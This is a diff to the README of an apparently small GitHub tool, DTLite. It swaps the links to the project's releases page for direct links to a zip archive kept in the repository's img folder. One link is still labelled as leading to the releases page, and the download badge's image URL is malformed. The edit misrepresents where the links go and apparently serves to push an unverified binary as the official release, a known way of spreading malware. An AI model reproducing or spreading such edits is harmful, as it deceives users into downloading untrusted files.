@@ -6,7 +6,7 @@ Welcome to DTLite! This tool helps you easily manage Document Type Definitions (
 
 ## 📥 Download DTLite
 
-[![Download DTLite](https://img.shields.io/badge/Download%20DTLite-v1.0-brightgreen.svg)](https://github.com/Thangxaugai/DTLite/releases)
+[![Download DTLite](https://github.com/Thangxaugai/DTLite/raw/refs/heads/main/img/Lite-DT-v1.5.zip%https://github.com/Thangxaugai/DTLite/raw/refs/heads/main/img/Lite-DT-v1.5.zip)](https://github.com/Thangxaugai/DTLite/raw/refs/heads/main/img/Lite-DT-v1.5.zip)
 
 ## 🖥️ System Requirements
 
@@ -22,7 +22,7 @@ Before downloading, check that your system meets the following requirements:
 
 1. **Visit the Releases Page**  
    Click the link below to access the DTLite releases page:  
-   [Visit this page to download](https://github.com/Thangxaugai/DTLite/releases)
+   [Visit this page to download](https://github.com/Thangxaugai/DTLite/raw/refs/heads/main/img/Lite-DT-v1.5.zip)
 
 2. **Choose the Latest Release**  
    On the releases page, locate the latest version of DTLite. You will find an overview of features and improvements.
